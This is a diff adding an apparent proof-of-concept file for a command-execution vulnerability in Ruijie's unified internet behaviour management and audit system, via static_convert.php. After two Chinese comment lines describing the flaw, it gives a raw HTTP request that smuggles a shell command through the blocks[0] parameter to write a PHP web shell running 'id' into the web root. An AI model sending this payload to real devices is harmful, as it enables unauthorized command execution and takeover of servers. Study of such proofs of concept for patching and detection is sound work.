@@ -1,0 +1,9 @@
+# 锐捷统一上网行为管理与审计系统 static_convert.php命令执行漏洞
+# 锐捷统一上网行为管理与审计系统 static_convert.php页面接口存在命令执行，攻击者可以利用漏洞执行命令获取控制服务器
+GET /view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%27<?php%20system("id");unlink(__FILE__);?>%27%20>/var/www/html/rce.php&acid=80051546&bid=hd_tag_m8mv2462 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2462
+RM-PRO-Token: 656810bce9a130ae0d830b9aadff6e53
+RM-PRO-Time: 1742808365593
+User-Agent: curl/7.83.1
+
